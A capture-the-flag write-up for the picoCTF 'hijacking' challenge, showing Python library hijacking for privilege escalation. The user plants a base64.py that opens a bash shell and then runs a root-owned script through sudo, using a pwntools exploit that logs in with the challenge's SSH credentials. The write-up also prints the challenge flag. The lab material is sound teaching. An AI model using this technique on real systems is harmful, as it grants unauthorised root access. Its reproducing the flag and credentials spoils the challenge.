# hijacking

## Challenge

The challenge description is as follows:

> Getting root access can allow you to read the flag.
> Luckily there is a python file that you might like to play with.
> Through Social engineering, we've got the credentials to use on the server.
> SSH is running on the server.
> 
> ```
> saturn.picoctf.net 56309
> Username: picoctf
> Password: rZSsB--vJK
> ```

In our home directory, we can find the file referred to by the description.
It is a hidden file named .server.py:

```
picoctf@challenge:~$ ls -al
total 16
drwxr-xr-x 1 picoctf picoctf   20 Mar 19 23:27 .
drwxr-xr-x 1 root    root      21 Mar 16 02:08 ..
-rw-r--r-- 1 picoctf picoctf  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 picoctf picoctf 3771 Feb 25  2020 .bashrc
drwx------ 2 picoctf picoctf   34 Mar 19 23:27 .cache
-rw-r--r-- 1 picoctf picoctf  807 Feb 25  2020 .profile
-rw-r--r-- 1 root    root     375 Mar 16 01:30 .server.py
```

The file contains the following Python code:

```py
import base64
import os
import socket
ip = 'picoctf.org'
response = os.system("ping -c 1 " + ip)
#saving ping details to a variable
host_info = socket.gethostbyaddr(ip) 
#getting IP from a domaine
host_info_to_str = str(host_info[2])
host_info = base64.b64encode(host_info_to_str.encode('ascii'))
print("Hello, this is a part of information gathering",'Host: ', host_info)
```

Notably, the file is owned by root.
If we check our sudo permissions, we can see that we are allowed to run the script as root:

```
picoctf@challenge:~$ sudo -l
Matching Defaults entries for picoctf on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoctf may run the following commands on challenge:
    (ALL) /usr/bin/vi
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
```

However, the script fails when we try to run it:

```
picoctf@challenge:~$ sudo /usr/bin/python3 /home/picoctf/.server.py
sh: 1: ping: not found
Traceback (most recent call last):
  File "/home/picoctf/.server.py", line 7, in <module>
    host_info = socket.gethostbyaddr(ip) 
socket.gaierror: [Errno -5] No address associated with hostname
```

## Solution

Python will load modules from the current working directory before other locations.

We can see that it imports a few modules, such as `base64`.
We can take advantage of this by creating a file called base64.py.
When this gets imported, it will run any Python code inside.

Now, we can run the .server.py script as root and execute our Python code.
We use this to read the flag file, possibly by dropping us into a root shell.

## Exploit

```py
#!/usr/bin/env python3

from pwn import *

host = args.HOST or 'saturn.picoctf.net'
port = int(args.PORT or 54448)
username = 'picoctf'
password = 'rZSsB--vJK'

s = ssh(host=host, port=port, user=username, password=password)
io = s.process('/bin/sh', env={'PS1':''})
io.sendline(b"echo \"import os; os.system('/bin/bash'); exit()\" > base64.py")
io.sendline(b"sudo python3 /home/picoctf/.server.py")
io.interactive()
```

## Flag

```
picoCTF{pYth0nn_libraryH!j@CK!n9_6924176e}
```
